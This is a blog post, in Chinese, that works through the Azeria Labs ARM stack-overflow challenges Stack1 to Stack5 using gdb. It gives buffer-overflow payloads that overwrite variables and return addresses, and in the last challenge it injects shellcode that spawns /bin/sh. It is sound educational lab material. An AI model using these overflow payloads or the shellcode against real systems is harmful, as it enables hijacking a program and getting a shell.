<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>Azeria Labs Challenges Stack1-5</title>
	
	<meta name="description" content="">
	<meta name="image" content="favicon.ico">
	
	<meta itemprop="name" content="Azeria Labs Challenges Stack1-5">
	<meta itemprop="description" content="">
	<meta itemprop="image" content="favicon.ico">
	
	<meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="Azeria Labs Challenges Stack1-5">
	<meta name="twitter:description" content="">
	<meta name="twitter:site" content="@everettjf">
	<meta name="twitter:creator" content="@everettjf">
	<meta name="twitter:image:src" content="favicon.ico">
	
	
	<meta name="og:title" content="Azeria Labs Challenges Stack1-5">
	<meta name="og:description" content="">
	<meta name="og:image" content="http://everettjf.com/favicon.ico">
	<meta name="og:url" content="http://everettjf.com/post/2017-12-03-azeria-labs-challenges-stack1-5/">
	<meta name="og:site_name" content="Azeria Labs Challenges Stack1-5">
	<meta name="og:type" content="article">
	
	<meta name="article:author" content="everettjf">
	<meta name="article:tag" content="">
	<link rel="stylesheet" type="text/css" href="/css/style.css">
	<script src="/js/caption.js"></script>

	<link rel="icon" href="/favicon.ico" type="image/x-icon">  
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">  

	
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111349332-1"></script>
	<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());

	gtag('config', 'UA-111349332-1');
	</script>

</head>

<body>

<header>
	<a href="/">/posts</a>
	
		
		&nbsp;&nbsp;·&nbsp;<a href="/about/" style="color:black;">/about</a>
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	
		
	


</header>


<div id="loadingMask" style="width: 100%; height: 100%; position: fixed; background: #fff;"></div>
<script>
function fadeOut(el) {
  el.style.opacity = 1;

  var last = +new Date();
  var tick = function() {
    el.style.opacity = +el.style.opacity - (new Date() - last) / 80;
    last = +new Date();
    

    if (el.style.opacity > 0) {
      (window.requestAnimationFrame && requestAnimationFrame(tick)) || setTimeout(tick, 16);
    } else {
    	el.style.display='none';
    }
  };

  tick();
}

function ready(fn) {
    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
         el = document.getElementById('loadingMask');
         fadeOut(el);
        var elements = document.querySelectorAll("img");
        Array.prototype.forEach.call(elements, function(el, i) {
            if (el.getAttribute("alt")) {
                const caption = document.createElement('figcaption');
                var node = document.createTextNode(el.getAttribute("alt"));
                caption.appendChild(node);
                const wrapper = document.createElement('figure');
                wrapper.className = 'image';
                el.parentNode.insertBefore(wrapper, el);
                el.parentNode.removeChild(el);
                wrapper.appendChild(el);
                wrapper.appendChild(caption);
            }
        });

    } else {
        document.addEventListener('DOMContentLoaded', fn);
    }
}
window.onload = ready;
</script>

<div class="content">
    <h1>Azeria Labs Challenges Stack1-5 <aside></aside></h1>

    <p>
    <nav id="TableOfContents">
<ul>
<li><a href="#背景">背景</a></li>
<li><a href="#环境">环境</a></li>
<li><a href="#题目-stack1">题目 Stack1</a>
<ul>
<li><a href="#初步运行">初步运行</a></li>
<li><a href="#调试">调试</a></li>
<li><a href="#通过">通过</a></li>
</ul></li>
<li><a href="#题目-stack2">题目 Stack2</a></li>
<li><a href="#题目-stack3">题目 Stack3</a></li>
<li><a href="#题目-stack4">题目 Stack4</a></li>
<li><a href="#题目-stack5">题目 Stack5</a></li>
</ul>
</nav>
    </p>

    <hr/>
    <p>&nbsp;</p>

    

<h1 id="背景">背景</h1>

<p>最近学习了 <a href="https://azeria-labs.com/">https://azeria-labs.com/</a> 出的ARM Exploit教程，最后作者出了几个挑战题目，以下是的解题思路。</p>

<p>题目在这： <a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">https://azeria-labs.com/part-3-stack-overflow-challenges/</a></p>

<h1 id="环境">环境</h1>

<ol>
<li>直接使用作者提供的虚拟机 <a href="https://azeria-labs.com/arm-lab-vm/">https://azeria-labs.com/arm-lab-vm/</a></li>
<li>armv6 树莓派</li>
</ol>

<h1 id="题目-stack1">题目 Stack1</h1>

<pre><code>What you will learn

How to modify variables to specific values in the program
How the variables are laid out in memory
Goal: Change the ‘modified’ variable. You solved the challenge once “You have changed the ‘modified’ variable” is printed out.
</code></pre>

<h2 id="初步运行">初步运行</h2>

<p>先直接运行看看，</p>

<pre><code>pi@raspberrypi:~/ARM-challenges $ ./stack1
stack1: please specify an argument
</code></pre>

<p>那就加个参数</p>

<pre><code>pi@raspberrypi:~/ARM-challenges $ ./stack1 1111111111111111
Try again, you got 0x00000000
</code></pre>

<p>再参数长点</p>

<pre><code>pi@raspberrypi:~/ARM-challenges $ ./stack1 111111111111111111111111111111111111111111111111111111111111111111111111111111
Try again, you got 0x31313131
Segmentation fault
</code></pre>

<p>哇，数值变了。0x31就是1啦。而且crash了。</p>

<h2 id="调试">调试</h2>

<pre><code>gdb stack1
break main
run
</code></pre>

<p>输出汇编</p>

<pre><code>gef&gt; disassemble main
Dump of assembler code for function main:
=&gt; 0x000104b0 &lt;+0&gt;:	push	{r11, lr}
   0x000104b4 &lt;+4&gt;:	add	r11, sp, #4
   0x000104b8 &lt;+8&gt;:	sub	sp, sp, #80	; 0x50
   0x000104bc &lt;+12&gt;:	str	r0, [r11, #-80]	; 0x50
   0x000104c0 &lt;+16&gt;:	str	r1, [r11, #-84]	; 0x54
   0x000104c4 &lt;+20&gt;:	ldr	r3, [r11, #-80]	; 0x50
   0x000104c8 &lt;+24&gt;:	cmp	r3, #1
   0x000104cc &lt;+28&gt;:	bne	0x104dc &lt;main+44&gt;
   0x000104d0 &lt;+32&gt;:	mov	r0, #1
   0x000104d4 &lt;+36&gt;:	ldr	r1, [pc, #92]	; 0x10538 &lt;main+136&gt;
   0x000104d8 &lt;+40&gt;:	bl	0x10370
   0x000104dc &lt;+44&gt;:	mov	r3, #0
   0x000104e0 &lt;+48&gt;:	str	r3, [r11, #-8]
   0x000104e4 &lt;+52&gt;:	ldr	r3, [r11, #-84]	; 0x54
   0x000104e8 &lt;+56&gt;:	add	r3, r3, #4
   0x000104ec &lt;+60&gt;:	ldr	r3, [r3]
   0x000104f0 &lt;+64&gt;:	sub	r2, r11, #72	; 0x48
   0x000104f4 &lt;+68&gt;:	mov	r0, r2
   0x000104f8 &lt;+72&gt;:	mov	r1, r3
   0x000104fc &lt;+76&gt;:	bl	0x10340
   0x00010500 &lt;+80&gt;:	ldr	r3, [r11, #-8]
   0x00010504 &lt;+84&gt;:	ldr	r2, [pc, #48]	; 0x1053c &lt;main+140&gt;
   0x00010508 &lt;+88&gt;:	cmp	r3, r2
   0x0001050c &lt;+92&gt;:	bne	0x1051c &lt;main+108&gt;
   0x00010510 &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x10540 &lt;main+144&gt;
   0x00010514 &lt;+100&gt;:	bl	0x1034c
   0x00010518 &lt;+104&gt;:	b	0x1052c &lt;main+124&gt;
   0x0001051c &lt;+108&gt;:	ldr	r3, [r11, #-8]
   0x00010520 &lt;+112&gt;:	ldr	r0, [pc, #28]	; 0x10544 &lt;main+148&gt;
   0x00010524 &lt;+116&gt;:	mov	r1, r3
   0x00010528 &lt;+120&gt;:	bl	0x10334
   0x0001052c &lt;+124&gt;:	mov	r0, r3
   0x00010530 &lt;+128&gt;:	sub	sp, r11, #4
   0x00010534 &lt;+132&gt;:	pop	{r11, pc}
   0x00010538 &lt;+136&gt;:			; &lt;UNDEFINED&gt; instruction: 0x000105bc
   0x0001053c &lt;+140&gt;:	cmnvs	r2, r4, ror #6
   0x00010540 &lt;+144&gt;:	ldrdeq	r0, [r1], -r8
   0x00010544 &lt;+148&gt;:	andeq	r0, r1, r0, lsl r6
End of assembler dump.

</code></pre>

<p>初步分析和调试下代码</p>

<p><img src="/media/15122339822130.jpg" alt="" /></p>

<p>上图红框中最关键的几行代码，只要满足 r3 r2 相等，就可以完成此题。调试发现 r2 每次都是0x61626364，字符串就是 <code>dcba</code>（小端）。</p>

<p>r2是相对pc的偏移，一般就是代码中的常量了。r3是相对r11（也就是fp）偏移-8。现在重点到看看r11。</p>

<p>r11是Frame Pointer地址（栈底），sp是栈顶，一般函数内的变量可以通过fp取相对偏移获取。程序的输入参数也是这样。</p>

<p>从上面我们输入超长数据的结果可知，超长数据覆盖了 <code>[r11,#-8]</code>，那程序大概就是简单的把输入存到字符数组中。</p>

<p>根据<code>sub sp,sp,#80</code>看到栈大小有80字节，也就是20个word。而r11是 sp+4后的值，这样我们可以看下整个Frame上的数据，在加上main第一行push也让sp减8，因此总共23个word。（由于当时计算错误，下面的命令就只输出22个，不过也够用了）用命令 <code>x/22w $r11-84</code> 输出。</p>

<p><img src="/media/15122365637942.jpg" alt="" /></p>

<p>也就是把上图右下角的数值改为 0x61626364 就好了。
从第一个0x31313131算，需要17*4=64个字符，最后四个需要是<code>dcba</code>。</p>

<p>这样试试</p>

<p><img src="/media/15122367482364.jpg" alt="" /></p>

<p><img src="/media/15122367796672.jpg" alt="" /></p>

<h2 id="通过">通过</h2>

<p>终于挑战通过。Yeah!</p>

<p><img src="/media/15122368686347.jpg" alt="" /></p>

<p>就像题目所说，是为了熟悉下 How the variables are laid out in memory。</p>

<h1 id="题目-stack2">题目 Stack2</h1>

<p>与上一题目差不多，只是输入方式变成了环境变量。</p>

<p><img src="/media/15123013446710.jpg" alt="" /></p>

<p>断点到cmp指令可以看到，需要让环境变量最后的数值为\n\r\n\r。</p>

<p><img src="/media/15123014415309.jpg" alt="" /></p>

<p>也就是覆盖到上图的地址。从第一个0x31算下（假设输入是很多1111111），也就是需要17*4的字符，最后四个字符是<code>\n\r\n\r</code>。</p>

<p>怎么设置环境变量是<code>\n\r</code>呢？参考Stack Overflow的回答 <a href="https://stackoverflow.com/questions/41309822/how-do-i-actually-write-n-r-to-an-environment-variable">https://stackoverflow.com/questions/41309822/how-do-i-actually-write-n-r-to-an-environment-variable</a></p>

<p>以下答案都可以了：</p>

<pre><code>export GREENIE=$'1111111111111111111111111111111111111111111111111111111111111111\n\r\n\r'

# 136 = 17*4*2
export GREENIE=&quot;$(python -c 'print &quot;\n\r&quot;*136')&quot;
</code></pre>

<h1 id="题目-stack3">题目 Stack3</h1>

<p><img src="/media/15123029483316.jpg" alt="" /></p>

<p>看到跳转到r3，也就是r11-8。</p>

<p><img src="/media/15123034988550.jpg" alt="" /></p>

<p>可见就是要覆盖上图中的0x31313131，17*4的数据最后4个就是覆盖函数调用的地址。</p>

<p><img src="/media/15123036349068.jpg" alt="" /></p>

<p>覆盖为00 01 04 7c即可，由于小端，输入如下：</p>

<pre><code>1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00
</code></pre>

<p>最终需要这样：</p>

<pre><code>printf '1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00' | ./stack3
</code></pre>

<p><img src="/media/15123481953215.jpg" alt="" /></p>

<h1 id="题目-stack4">题目 Stack4</h1>

<p><img src="/media/15123520903550.jpg" alt="" /></p>

<p>要覆盖pc，就是要覆盖最后的栈中存储lr的位置。</p>

<p><img src="/media/15123520264720.jpg" alt="" /></p>

<p>数组长度68，+4可以覆盖r11，再+4可以覆盖lr。</p>

<p><img src="/media/15123521883470.jpg" alt="" /></p>

<p>也就是覆盖最后4个字节为00 01 04 4c。</p>

<p>答案就是：</p>

<pre><code>printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c\x04\x01\x00' | ./stack4
</code></pre>

<p><img src="/media/15123526858244.jpg" alt="" /></p>

<h1 id="题目-stack5">题目 Stack5</h1>

<p>先看代码与stack4一样，不同的是：这次我们要执行自己的shellcode。</p>

<p>shellcode 我们就用之前章节的 <a href="https://azeria-labs.com/writing-arm-shellcode/">https://azeria-labs.com/writing-arm-shellcode/</a></p>

<pre><code>printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c\x04\x01\x00' | ./stack5

</code></pre>

<p><img src="/media/15124064941002.jpg" alt="" /></p>

<p>由于要执行我们的shellcode，那把lr改为栈的下一个地址，然后后面存放shellcode。</p>

<pre><code>11111111111111111111111111111111111111111111111111111111111111111111

\xf0\xf1\xff\xbe

\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
</code></pre>

<p>因此可以这样：</p>

<pre><code>printf '11111111111111111111111111111111111111111111111111111111111111111111\xf0\xf1\xff\xbe\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78' | ./stack5

</code></pre>


    
</div>



	<p><small><em>Written December 3, 2017. </em>
		 
		Send feedback to <a  href="https://twitter.com/intent/tweet?text=%40everettjf%20%23post2017-12-03-azeria-labs-challenges-stack1-5%20">@everettjf</a>.
		
    </small></p>

	<p>
	<a href="/post/2017-11-03-machoexplorer-alpha/">← MachOExplorer Alpha Release</a>&nbsp;
	
	</p>



<section id="disqus_thread"></section>


<script type="text/javascript">
     
    var disqus_shortname = 'everettjf';

     
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

     
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>



<footer>
	<hr/>
	<p>https://creativecommons.org/licenses/by-nc-sa/2.5/</p>
	<p>This site was made with <a href="https://github.com/gohugoio/hugo">Hugo</a> using theme <a href="https://github.com/schollz/onetwothree">onetwothree</a>.</p>
</footer>
</body>
</html>
